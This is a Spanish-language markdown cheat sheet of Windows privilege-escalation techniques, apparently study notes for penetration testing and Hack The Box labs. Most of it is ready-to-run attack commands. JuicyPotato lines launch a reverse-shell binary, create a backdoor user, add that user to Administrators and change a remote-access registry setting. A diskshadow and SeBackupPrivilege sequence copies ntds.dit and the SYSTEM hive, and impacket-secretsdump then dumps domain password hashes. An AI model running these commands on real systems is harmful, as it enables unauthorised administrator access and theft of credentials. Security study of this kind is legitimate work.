## Windows Privilege Escalation

Técnicas utilizadas para escalar privilegios en sistemas basados en Windows.

### Recursos

[Hacktricks - Windows Privesc Checklist](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)

[Payload All The Things - Windows Privesc Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

[Sushant Guide OSCP](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html)

[Another good guide](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-windows)


### Técnicas comúnes para escalar privilegios 


- [Abusing Tokens](#whoami-priv)
  - [SeImpersonatePrivilege](#SeImpersonatePrivilege)
  - [SeBackupPrivilege & SeRestorePrivilege](#SeBackupPrivilege-And-SeRestorePrivilege)
- [Privileged Groups](#whoami-groups)
- [Servicios Vulnerables](#Servicios-Vulnerables)

## whoami priv

[Hacktricks Guide](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens)

**Lista de Tokens de Acceso interesantes**

|Privilege|Privilege|
|--|--|
|**SeImpersonatePrivilege**|**SeAssignPrimaryPrivilege**|
|**SeTcbPrivilege**|**SeBackupPrivilege**|
|**SeRestorePrivilege**|**SeCreateTokenPrivilege**|
|**SeLoadDriverPrivilege**|**SeTakeOwnershipPrivilege**|
|**SeDebugPrivilege**||

### SeImpersonatePrivilege

#### Mediante una Reverse Shell

**Tool**: JuicyPotato.exe 
```cmd
.\jp.exe -t * -l 1333 -p "c:\windows\system32\cmd.exe" -a "/c c:\windows\temp\rev.exe" -c <clsid> (optional)
```
#### Creando nuestro propio usuario
```cmd
.\jp.exe -t * -l 1333 -p "c:\windows\system32\cmd.exe" -a "/c net user chan chan123 /ADD"
```
**Agregándo nuestro usuario al grupo Local Administrators**
```cmd
.\jp.exe -t * -l 1333 -p "c:\windows\system32\cmd.exe" -a "/c net localgroup Administrators chan /add" 
```
**Cambiando el registro LocalAccountTokenFilterPolicy para poder tener acceso remoto**
```cmd
.\jp.exe -t * -l 1333 -p "c:\windows\system32\cmd.exe" -a "/c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f" 
```
 
### SeBackupPrivilege And SeRestorePrivilege

**Crear una lista de instrucciones que serán ejecutadas con Diskshadow (Herramienta de gestión de discos)**

```bash
SET CONTEXT PERSISTENT NOWRITERS#
add volume c: alias chan#
create#
expose %chan% z:#
```
**Lo subimos a nuestro target y ejecutamos**
```cmd
diskshadow /s fichero_instrucciones.txt
```

**Luego subimos e importamos dos Dlls que nos servirán para copiar archivos entre discos**

[Dlls utilizados](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)

```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

**Copiamos el ntds.dit (Base de datos que almacena hashes del AD)**
```powershell
Copy-FileSeBackupPrivilege z:\windows\NTDS\ntds.dit c:\temp\ntds.dit
```
**Guardamos la llave system del registro de windows**
```powershell
reg save HKLM/SYSTEM c:\temp\system
```
**Dumpeamos los hashes con impacket-secretsdump y voila**
```bash
impacket-secretsdump -ntds ndts.dit -system system -hashes lmhash:nthash LOCAL
```

## whoami groups

[Guía detallada](https://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges)

### Dns admins

***HTB Machine*** : **Resolute**


## Servicios Vulnerables

**Obtener lista de servicios**

```cmd
net start
wmic service list brief
sc query
Get-Service
```
**Obtener permisos del servicio**

```cmd
sc qc <service_name>
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

**Ver si Authenticated Users pueden modificar el servicio**

```cmd
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

### Insecure Permissions daclsvc

**Usando accesschk.exe para verificar los permisos del usuario actual sobre un servicio en específico**
```cmd
.\accesschk.exe /accepteula -uwcqv <user> daclsvc
```





